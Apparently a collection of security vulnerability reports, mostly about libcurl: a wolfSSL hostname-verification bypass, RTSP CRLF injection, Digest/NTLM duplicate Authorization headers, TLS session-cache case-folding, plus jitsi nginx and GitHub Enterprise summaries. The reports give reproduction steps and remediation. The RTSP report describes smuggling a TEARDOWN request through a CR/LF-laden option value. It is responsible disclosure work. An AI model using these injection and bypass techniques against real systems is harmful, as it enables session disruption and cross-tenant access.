Improper Validation of Certificate with Host Mismatch -- CWE-297. curl's own documentation states that CURLOPT_SSL_VERIFYHOST operates independently of CURLOPT_SSL_VERIFYPEER; on the wolfSSL backend that independence is not actually enforced at the point where it matters (post-handshake), even though it is correctly reflected at the point of registering the check.

## Severity

Medium.

Justification: this is a demonstrated, reproducible hostname-verification bypass with real MITM impact, backed by curl's own historical precedent of assigning CVEs to this exact bug class (verifypeer/verifyhost independence failures) in a different backend context previously. We are not rating this higher than Medium initially because it requires a specific, non-default application configuration (CURLOPT_SSL_VERIFYPEER=0) combined with a specific TLS backend choice (wolfSSL) rather than being exploitable against curl's default configuration or an arbitrary curl build, and because we have not surveyed how common this backend/option combination is in real-world deployments.

Illustrative CVSS 3.1 vector for the demonstrated scenario: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N. Offered only as a concrete reference point for how we reasoned about the demonstrated test, not as a claim of the final score -- we recognize curl's security team makes the final severity determination.

## Remediation

Add an explicit, independent post-handshake hostname check for the SNI (named-host) case in wssl_connect_step2(), structured like the existing IP-address-specific check that already exists a few lines below it: after a successful wolfSSL_connect(), when conn_config->verifyhost is set and an SNI hostname was used, verify the presented certificate's subject/SAN against that hostname independently of whatever WOLFSSL_VERIFY_NONE already decided, and fail the connection if it does not match -- mirroring how the IP-address path already re-checks via wolfSSL_X509_check_ip_asc() regardless of the configured verify mode.

## Regression Test

Add a libcurl test case that, when built against wolfSSL, connects with CURLOPT_SSL_VERIFYPEER=0 and default CURLOPT_SSL_VERIFYHOST to a server presenting a certificate for an unrelated hostname, and asserts the connection is rejected with a peer/host verification error rather than succeeding.

## Impact

## Confirmed impact

An attacker positioned on the network path (or a compromised/malicious server) can present a certificate for any hostname and have it silently accepted by a curl/wolfSSL client that has set CURLOPT_SSL_VERIFYPEER=0 while relying on CURLOPT_SSL_VERIFYHOST's default to still protect against impersonation -- a common, documented, and reasonable pattern (e.g. connecting to internal hosts with self-signed or CA-less certificates while still expecting the requested hostname to be enforced). This defeats hostname-based MITM protection entirely for such connections. Demonstrated end to end with a real TLS handshake and HTTP exchange, not inferred from source reading alone.

## Limitations

- Requires the application to explicitly set CURLOPT_SSL_VERIFYPEER=0; this is not curl's default behavior and is not triggerable without that specific application configuration.
- Requires curl to be built with the wolfSSL TLS backend specifically. We tested OpenSSL directly as a control and it is not affected. We have not tested every other curl TLS backend and are not claiming this is universal across backends.
- We have not identified a specific named open-source application that uses this exact option combination with the wolfSSL backend.

title: RTSP CRLF injection in libcurl allows CURLOPT_RTSP_* values to inject commands into independent sessions
vulnerability_information:
## Summary

libcurl's RTSP code interpolates the values of `CURLOPT_RTSP_STREAM_URI`, `CURLOPT_RTSP_TRANSPORT`, and `CURLOPT_RTSP_SESSION_ID` directly into the RTSP request text with no check for embedded CR/LF, so a value containing `\r\n` splits one intended RTSP operation into multiple independent RTSP requests on the wire. I reproduced this on libcurl 8.21.0 and current HEAD (`5c61e16869` / `8.22.0-DEV`). Using a stateful test server modeling independent named RTSP resources (the way small/embedded RTSP servers, e.g. IP cameras and NVRs, commonly track a fixed set of channels), I demonstrated that an application performing a single, legitimate `SETUP` on its own resource can have a smuggled `TEARDOWN` command injected via `CURLOPT_RTSP_STREAM_URI` that terminates a completely independent, already-active session established over a separate connection by an unrelated party. The victim's later request against its own session then fails with `454 Session Not Found`, even though the injecting application never referenced that session or resource. None of the three affected options are documented as raw/unsanitized protocol syntax -- unlike `CURLOPT_HTTPHEADER`, which explicitly warns it applies no filtering -- each is documented as a single well-formed value (a stream URI, a transport spec, a session ID). AI assistance (Claude) was used during source analysis, experiment design, and drafting this report; all technical claims and the reproduction below were independently run and verified by the researcher.

## Affected Version

- curl/libcurl 8.21.0 (release tag `curl-8_21_0`)
- Also reproduced on current HEAD, commit `5c61e16869` (`8.22.0-DEV`)
- Build used for reproduction: local build from source, OpenSSL backend
- RTSP is compiled in by default (`CURL_DISABLE_RTSP` defaults to `OFF`; RTSP is not listed as experimental in `docs/EXPERIMENTAL.md`)
- `curl -V` output from the two builds used:
  - `curl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV OpenSSL/3.5.5 zlib/1.3.1`
  - `curl 8.22.0-DEV (Linux) libcurl/8.22.0-DEV OpenSSL/3.5.5 zlib/1.3.1`

## Steps to Reproduce

1. Build curl from the `curl-8_21_0` tag (or use HEAD) with RTSP support (default-on).
2. Stand up a stateful RTSP test server that tracks session state per named resource path (e.g. `/camera-A`, `/camera-B`) globally, independent of which TCP connection issues a request -- modeling how small/embedded RTSP servers commonly implement a fixed set of channels.
3. Victim, connection #1: send `SETUP /camera-A RTSP/1.0` then `PLAY /camera-A RTSP/1.0`. Server marks `/camera-A` active and returns `200 OK` for both.
4. Unrelated application, connection #2: using an unmodified libcurl client, call `curl_easy_setopt(CURLOPT_URL, "rtsp://HOST/camera-B")` and set `CURLOPT_RTSP_STREAM_URI` to a value containing an embedded CR/LF sequence, then issue a `SETUP` request. The application's intent is exactly one operation, on its own resource, `/camera-B`.
5. Capture the raw bytes leaving the client on connection #2 and confirm they contain two independent, well-formed RTSP requests: the intended `SETUP /camera-B RTSP/1.0` followed by an attacker-influenced `TEARDOWN /camera-A RTSP/1.0`.
6. Confirm server-side that `/camera-A`'s session state transitions from active to torn down as a direct result of processing connection #2's bytes -- a resource that connection, that application call, and that `curl_easy_setopt` invocation never referenced.
7. Victim, connection #3 (a fresh connection resuming its own session, matching the documented use of `CURLOPT_RTSP_SESSION_ID`: "Useful for resuming an in-progress session"): send `PLAY /camera-A RTSP/1.0`. Confirm the response is `454 Session Not Found` instead of the `200 OK` it would have received before step 4-6.
8. Repeat with a clean, well-formed `CURLOPT_RTSP_STREAM_URI`/`CURLOPT_RTSP_TRANSPORT` value (control case) and confirm exactly one request is sent and no cross-session effect occurs.

This was implemented as: a standalone libcurl C reproducer (`rtsp_repro.c`, parameterized by mode) driving the malicious `SETUP`; a stateful Python RTSP test server (`rtsp_stateful_server.py`) tracking per-resource session state and logging every parsed request plus the resulting state table; and a driver (`rtsp_crosssession_test.py`) that runs the full three-connection sequence and prints the server-side causal log end to end. All three are attached to this report as the PoC.

## Vulnerable Source

`lib/rtsp.c`:
- `rtsp_setup_request()`: `b->session_id`, `b->stream_uri`, and the value passed to `rtsp_header_alloc()` for the `Transport:` header are read directly from `CURL_EASY_STR(data, STRING_RTSP_SESSION_ID / STREAM_URI / TRANSPORT)` with no validation.
- `rtsp_header_alloc()`: `*target = curl_maprintf("%s: %s\r\n", header_name, value)` -- raw, unescaped interpolation.
- Request-line construction inside `rtsp_do()`:
```
curlx_dyn_addf(&req_buffer,
               "%s %s RTSP/1.0\r\n"     /* Request Stream-URI RTSP/1.0 */
               "CSeq: %u\r\n",
               block.request, block.stream_uri, rtsp->CSeq_sent);
...
curlx_dyn_addf(&req_buffer, "Session: %s\r\n", block.session_id);
```
`block.stream_uri` sits directly in the request line; `block.session_id` and the Transport value sit directly in header lines. None of the three is checked for CR/LF anywhere in this file.

The same function does explicitly guard against the application setting `CSeq` or `Session` as a custom header via `CURLOPT_HTTPHEADER` ("Session ID cannot be set as a custom header") -- the maintainers were alert to header confusion through that specific path, just not to CR/LF embedded inside the values of these three dedicated RTSP options. This pattern -- an app-supplied `CURLOPT_*` string interpolated unchecked into a line-oriented protocol command -- is the same shape as several fixes curl has shipped in the last two months for other protocols (SMTP envelope address, FTP ACCT, MIME part name/filename, gopher selector, MQTT topic, LDAP filter values), none of which touched RTSP.

We checked the documentation for all three options before reporting: CURLOPT_RTSP_STREAM_URI.md, CURLOPT_RTSP_TRANSPORT.md, and CURLOPT_RTSP_SESSION_ID.md each describe a single, well-formed data value (a URI, a transport specification, a session identifier) and give example values that are never raw multi-line protocol text. None carries any disclaimer comparable to CURLOPT_HTTPHEADER's explicit "libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters." CURLOPT_RTSP_SESSION_ID.md even contains a security-motivated WARNING about a different risk (session-ID reuse across hosts on a reused handle) without ever mentioning CR/LF -- indicating this is a gap in what the maintainers considered, not a deliberately accepted and documented risk.

## Impact

### Confirmed impact

Using a stateful test server modeling independent named RTSP resources (not a real IP camera or NVR product -- a synthetic model of that class of server's session-tracking behavior), we demonstrated that a single `CURLOPT_RTSP_STREAM_URI` value, supplied by an application performing a `SETUP` against its own resource, can smuggle a second, fully independent, well-formed RTSP request (`TEARDOWN`) that terminates a different, already-active session established over an entirely separate connection by an unrelated party. The causal chain was traced end to end: the victim's session shows as active before the injection, the server's session-state log shows the transition to torn down attributed to the unrelated connection's request, and the victim's own subsequent request against the same resource independently confirms the loss (`454 Session Not Found`). This is unauthorized cross-session/cross-resource command injection with a demonstrated availability impact on a party the injecting application had no relationship to, reproduced identically on 8.21.0 and HEAD.

### Limitations

- The test server is a minimal synthetic model built to isolate and prove the session-tracking-by-resource behavior pattern; we have not tested against, and are not claiming to have compromised, any specific real IP camera, NVR, or other RTSP server product. Real servers' session-identification strategies vary (some may key strictly on server-issued session tokens rather than resource path), which would change exploitability details without changing the underlying request-splitting primitive.
- Exploitation requires a necessary precondition: the application must pass attacker-controlled or attacker-influenced data into one of `CURLOPT_RTSP_STREAM_URI`, `CURLOPT_RTSP_TRANSPORT`, or `CURLOPT_RTSP_SESSION_ID` without checking it for CR/LF first. This is not exploitable against curl by default or without that specific application behavior.
- We did not attempt to demonstrate RTP/media-stream redirection via an injected `SETUP` with altered Transport parameters. That remains a plausible further consequence we have not built or verified, and we are not claiming it.
- Not demonstrated: confidentiality impact, authentication bypass, or code execution.
- We have not identified a specific named open-source application using this exact option-forwarding pattern.

## Weakness

Improper Neutralization of CRLF Sequences ('CRLF Injection') -- CWE-93. This is the correct protocol-agnostic classification for the mechanism (curl's own recent fixes for the same shape of bug in SMTP/FTP/MIME/gopher/MQTT/LDAP fall under the same weakness). The demonstrated consequence here is unauthorized command injection affecting an independent session/resource; if the program's taxonomy has a more specific category it considers a better fit for that consequence, we'd defer to their judgment, but CWE-93 is our primary recommendation as it accurately names the root cause.

## Severity

Medium, offered as our assessment -- we recognize curl's security team makes the final determination and the illustrative CVSS vector below is not a substitute for that.

Justification: this is a demonstrated, reproducible instance of one application's single, legitimate operation on its own resource causing unauthorized termination of an independent, unrelated party's active session on a different resource -- a genuine violation of the isolation that's supposed to exist between independent RTSP sessions, not merely malformed output. We are not rating it higher than Medium because of the necessary precondition identified above (the application must first forward attacker-controlled or attacker-influenced data into one of these three options; this is not triggerable against arbitrary curl usage or by default), because the demonstration is against a synthetic test server modeling this class of server's session-tracking behavior rather than a verified real product, and because no confidentiality impact or authentication bypass has been shown.

Illustrative CVSS 3.1 vector for the demonstrated scenario: AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:L. We offer this only as a concrete reference point for how we reasoned about the demonstrated test, not as a claim of the final score.

## Remediation

Add the same CR/LF rejection already used for SMTP/FTP/MIME/gopher/MQTT/LDAP at the three read points in `rtsp_setup_request()`:
```
b->session_id = CURL_EASY_STR(data, STRING_RTSP_SESSION_ID);
if(b->session_id && strpbrk(b->session_id, "\r\n")) {
  failf(data, "Refusing to send a Session ID with a CR or LF");
  return CURLE_BAD_FUNCTION_ARGUMENT;
}
```
...mirrored for STRING_RTSP_STREAM_URI and the value passed into rtsp_header_alloc() for STRING_RTSP_TRANSPORT. Given how many call sites across the codebase now carry this same hand-written check, a shared helper (e.g. Curl_str_has_crlf()) used by all of them, including this one, would reduce the risk of the next protocol handler missing it.

## Regression Test

Add a libcurl test case: set CURLOPT_RTSP_STREAM_URI (and separately CURLOPT_RTSP_TRANSPORT, CURLOPT_RTSP_SESSION_ID) to a value containing "\r\nX-Injected: yes", issue a SETUP/PLAY, and assert curl_easy_perform() returns CURLE_BAD_FUNCTION_ARGUMENT before anything reaches the wire -- mirroring the structure of the existing SMTP CR/LF regression test (test 2110).

## AI Disclosure

AI assistance (Claude) was used during source analysis, experiment design, and preparation of this report. All technical claims, the reproduction steps, and the source citations above were independently run and verified by the researcher before submission; nothing in this report is asserted on the basis of AI output alone.

## Impact

## Confirmed impact

Using a stateful test server modeling independent named RTSP resources (not a real IP camera or NVR product -- a synthetic model of that class of server's session-tracking behavior), we demonstrated that a single CURLOPT_RTSP_STREAM_URI value, supplied by an application performing a SETUP against its own resource, can smuggle a second, fully independent, well-formed RTSP request (TEARDOWN) that terminates a different, already-active session established over an entirely separate connection by an unrelated party. The causal chain was traced end to end: the victim's session shows as active before the injection, the server's session-state log shows the transition to torn down attributed to the unrelated connection's request, and the victim's own subsequent request against the same resource independently confirms the loss (454 Session Not Found). This is unauthorized cross-session/cross-resource command injection with a demonstrated availability impact on a party the injecting application had no relationship to, reproduced identically on 8.21.0 and HEAD.

## Limitations

- The test server is a minimal synthetic model built to isolate and prove the session-tracking-by-resource behavior pattern; we have not tested against, and are not claiming to have compromised, any specific real IP camera, NVR, or other RTSP server product.
- Exploitation requires a necessary precondition: the application must pass attacker-controlled or attacker-influenced data into one of CURLOPT_RTSP_STREAM_URI, CURLOPT_RTSP_TRANSPORT, or CURLOPT_RTSP_SESSION_ID without checking it for CR/LF first. This is not exploitable against curl by default or without that specific application behavior.
- We did not attempt to demonstrate RTP/media-stream redirection via an injected SETUP with altered Transport parameters, and are not claiming it.
- Not demonstrated: confidentiality impact, authentication bypass, or code execution.

title: @jitsi/docker-jitsi-meet: `/colibri-relay-ws/` unsafe nginx regex (OCTO relay configuration)

summaries.author: 42x42
summaries.content:
@a3z4km3 reported an unsafe nginx regex pattern in docker-jitsi-meet's `/colibri-relay-ws/` location. When `ENABLE_OCTO` was enabled, the regex `[a-zA-Z0-9-\._]+` accepted arbitrary domain names and IP addresses for proxy_pass directives,  allowing unauthenticated requests to be proxied to attacker-specified destinations.

The vulnerable nginx location and associated relay WebSocket proxy configuration have been removed.

**Changes:**
* feat(web,jvb): remove deprecated colibri websocket support
  * https://github.com/jitsi/docker-jitsi-meet/pull/2285

We thank @a3z4km3 for submitting this report to us.

title: libcurl Digest/NTLM authentication ignores an explicit Authorization header
vulnerability_information:
## Summary

When an application sets an explicit `Authorization` header via `CURLOPT_HTTPHEADER` while libcurl also has credentials configured and HTTP Digest or NTLM authentication is selected/challenged, libcurl does not honor the application's header as a replacement — it sends its own internally generated Digest/NTLM credential in addition to the application's header. Basic, Bearer, Negotiate and AWS_SIGV4 were tested as controls and correctly suppress libcurl's own header in this situation; Digest and NTLM do not. This is reproducible on released libcurl 8.21.0 and on current HEAD (5c61e16869 / 8.22.0-DEV). The security consequence: against a test backend enforcing real per-tenant access control, a request carrying only a low-privilege tenant Bearer token retrieved another tenant's protected data, because the backend's ordinary Authorization-header parsing picked up libcurl's unwanted, more-privileged Digest credential instead of the application's own. `CURLOPT_HTTPHEADER`'s documentation states that an application-supplied header "otherwise generated and used by libcurl internally" is used instead of libcurl's own, with no documented exception for Digest/NTLM. AI assistance (Claude) was used for source analysis, experiment design, and drafting this report; all technical claims and reproduction steps below were independently run and verified by the researcher.

## Affected Version

- curl/libcurl 8.21.0 (release tag `curl-8_21_0`)
- Also reproduced on current HEAD, commit `5c61e16869` (`8.22.0-DEV`)
- Build used for reproduction: local build from source, OpenSSL backend, `-DCURL_ENABLE_NTLM=ON` (NTLM is not enabled by default in a cmake build and had to be turned on explicitly to test it)
- `curl -V` output from the two builds used:
  - `curl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV OpenSSL/3.5.5 zlib/1.3.1`
  - `curl 8.22.0-DEV (Linux) libcurl/8.22.0-DEV OpenSSL/3.5.5 zlib/1.3.1`

## Steps to Reproduce

1. Build curl from the `curl-8_21_0` tag (or use HEAD) with OpenSSL and NTLM enabled.
2. Write a minimal libcurl client that sets `CURLOPT_USERPWD` to a privileged test credential (`svc_account:PRIVILEGED_INFRA_SECRET`).
3. On the same handle, set `CURLOPT_HTTPHEADER` with an explicit `Authorization: Bearer LOW_PRIV_TENANT_B_TOKEN` header.
4. Set `CURLOPT_HTTPAUTH` to `CURLAUTH_DIGEST`.
5. Point the client at a test server that answers the first request with `401` + `WWW-Authenticate: Digest realm="...", nonce="...", qop="auth", algorithm=MD5`.
6. Capture the second (retried) request on the wire.
7. Confirm it contains two `Authorization` header lines:
   ```
   Authorization: Digest username="svc_account", realm="...", nonce="...", uri="...",
     cnonce="...", nc=00000001, qop=auth, response="...", algorithm=MD5
   Authorization: Bearer LOW_PRIV_TENANT_B_TOKEN
   ```
8. Have the server resolve identity using ordinary `Authorization` header access (Python's `http.server`/`email.message.get()`, which returns the first occurrence, was used in our test) and confirm it resolves to `svc-account`, not `tenant-b`.
9. Confirm the server, enforcing a real ACL (`tenant-b` → `/tenants/b/data` only, `svc-account` → all resources), returns the protected resource for a request that should have been scoped to `tenant-b`.
10. Repeat with `CURLOPT_USERPWD` removed (only the Bearer token set). Confirm the same server correctly denies the Digest challenge and no protected data is returned.

This was implemented as a standalone libcurl C reproducer (`repro.c`, parameterized by URL/scheme/credential/custom header) driving a local Python test server (`authz_server.py`) that performs the ACL check in step 9. Both are available on request.

## Vulnerable Source

- `lib/http.c`, function `output_auth_headers()`:
  - NTLM branch (`if(authstatus->picked == CURLAUTH_NTLM)`, ~line 707) — calls `Curl_output_ntlm()` unconditionally.
  - Digest branch (`if(authstatus->picked == CURLAUTH_DIGEST)`, ~line 716) — calls `Curl_output_digest()` unconditionally.
- `lib/http_ntlm.c`, `Curl_output_ntlm()` (~line 116) — no header-suppression check.
- `lib/http_digest.c`, `Curl_output_digest()` (~line 84) — no header-suppression check.

By contrast, the Basic branch (~line 727) and Bearer branch (~line 751) in the same `output_auth_headers()` function both gate their own header generation on `!Curl_checkheaders(data, STRCONST("Authorization"))` (and `!Curl_checkProxyheaders(...)` for the proxy case) and set `authstatus->done = TRUE` instead of adding their own header when the application has already supplied one. The Negotiate branch (~line 688) has the same guard as of a recent fix. Digest and NTLM are the two remaining branches in this function without that check anywhere in their call chain.

## Impact

### Confirmed impact

Using a test backend that enforces an actual per-tenant ACL (not a label), a request built entirely by the application to carry only a low-privilege, tenant-scoped Bearer token retrieved a different tenant's protected resource. This happened because libcurl also emitted its own Digest credential (derived from a privileged credential configured on the same handle), and the backend's ordinary `Authorization` header handling resolved the request's identity from that credential instead of the application's own. Removing the privileged credential from the client configuration (keeping only the Bearer token) reproduces the correct, secure outcome on the same server: the Digest challenge cannot be answered and no protected data is returned. This isolates the cause to the specific vulnerable configuration (a handle carrying both a privileged fallback credential and a per-call override header), not to any flaw in the ACL logic itself.

### Conditional impact

In a separate, explicitly isolated experiment, `CURLOPT_RESOLVE` was used to point the application's trusted hostname at a different endpoint while curl still treated it as the same origin. In that setup, libcurl's own Digest credential was delivered to that endpoint. This was **not** tested with a live DNS rebinding or DNS cache-poisoning attack — `CURLOPT_RESOLVE` was used only to isolate what happens once a hostname resolves elsewhere, not to demonstrate how an attacker would cause that resolution change in practice. This is reported as a conditional, secondary consideration, not as the primary vulnerability or a proven attack chain.

### Limitations

- This is not a generic authentication bypass: no external party forges or steals a credential; the confusion arises from libcurl emitting a credential the application already possessed and explicitly tried to withhold from this specific request.
- Not proven to affect every HTTP server or backend. Duplicate-`Authorization`-header handling was checked against several implementations; Python `http.server`, Node.js, Go `net/http`, Flask/Werkzeug and Apache all produced behavior (first-value or merged-value parsing) that could select the unwanted Digest credential, while nginx rejected the malformed duplicate-header request outright. This varies by server/backend and is not claimed to be universal.
- Not demonstrated as request smuggling or response desynchronization. No proxy/backend differential exploit was built or shown.
- Cross-origin credential handling was tested directly and works correctly: on a redirect to a different origin, libcurl does not send the credential to the new host. We are not claiming arbitrary cross-origin credential leakage.

## Weakness

**Incorrect Authorization (CWE-863)** — the demonstrated impact is that the receiving side authenticates and authorizes the request under the wrong identity because libcurl silently attaches a credential the application had explicitly tried to keep off the request. This is closer to "the wrong authorization decision gets made" than to a raw credential leak, so CWE-863 fits better than a generic information-exposure weakness. If the program prefers a different single weakness (e.g. Improper Authentication / CWE-287), we'd defer to their taxonomy, but CWE-863 is our primary recommendation.

## Severity

**Medium.**

Justification, based only on demonstrated (not conditional) impact: this does cause a real cross-tenant authorization violation against a backend enforcing a legitimate ACL, which is more than a cosmetic or protocol-compliance issue. But it requires a specific, non-default application configuration (a handle carrying both a privileged fallback credential and a per-call override header, with Digest or NTLM actually selected/challenged) rather than being exploitable against an arbitrary curl user or default configuration. It does not cross curl's origin boundary — that protection was tested directly and holds. It does not by itself compromise a server that doesn't already have this kind of split-credential configuration. Given the real but conditioned nature of the impact, we believe Medium is the accurate rating; we are not asserting High/Critical, and we are not inflating this simply because the demonstration involved privileged test credentials.

## Remediation

Add the same suppression check already used by Basic/Bearer/Negotiate to the Digest and NTLM branches of `output_auth_headers()` in `lib/http.c`: before calling `Curl_output_digest()` / `Curl_output_ntlm()`, check `!Curl_checkheaders(data, STRCONST("Authorization"))` (and `!Curl_checkProxyheaders(...)` for the proxy path), and set `authstatus->done = TRUE` instead of adding libcurl's own header when the application has already supplied one — mirroring the existing Basic/Bearer/Negotiate branches in the same function. A regression test should cover: application sets `CURLOPT_HTTPHEADER` with an explicit `Authorization:` header, credentials are configured via `CURLOPT_USERPWD`, `CURLOPT_HTTPAUTH` includes `CURLAUTH_DIGEST` (and separately `CURLAUTH_NTLM`), server challenges with the corresponding `WWW-Authenticate`, and the test asserts the retried request contains exactly one `Authorization` header, equal to the application-supplied value.

title: TLS session cache case-folds CA paths and bypasses the active trust profile
vulnerability_information:
curl 8.21.0 case-folds the entire TLS session-cache peer key, so two distinct CA files whose Unix paths differ only by case can share a TLS session ticket.

At `lib/vtls/vtls_scache.c:723`, `curl_strequal()` compares keys that include case-sensitive CA, CRL, and issuer paths, even though `docs/internals/TLS-SESSIONS.md` says lookup uses exactly the same peer key.

Run the attached `poc-casefolded-scache.py`: each of its two vulnerable passes first trusts `Trust.pem`, switches to an unrelated `trust.pem`, logs `SSL reusing session`, sends `Authorization: Bearer VICTIM_CANARY`, receives two HTTP 200 responses, and exits 0.

    cert controls: good_rc=0 bad_rc=2
    run1 case-only bad CA: rc=0 reused=True canary_sent=True http_200=2
    run2 case-only bad CA: rc=0 reused=True canary_sent=True http_200=2
    control different-name bad CA: rc=60 reused=False canary_sent=False http_200=1

The control uses the same unrelated CA under `Different.pem`; curl performs a full certificate handshake, exits 60, and never sends the canary, while changing the known-key lookup to `strcmp()` produces the same safe result.

Current master `2687751471c04e07a9c5da78338569d97aff7fd4` is still affected; this is a session-ticket-cache regression distinct from CVE-2021-22924's live connection-cache bug because the vulnerable cache was added later by `fa0ccd9f`, and I used AI to assist the audit and report while personally rerunning and checking every claim.

## Impact

An application that reuses a multi handle or shared TLS session cache across per-transfer CA profiles can send credentials or request data to a server that the active CA profile explicitly does not trust.

summaries.content:
An improper authorization vulnerability was identified in GitHub Enterprise Server that allowed a user with read access to a repository and write access to a project to modify issue and pull request metadata through the project. When adding an item to a project that already existed, column value updates were applied without verifying the actor's repository write permissions.
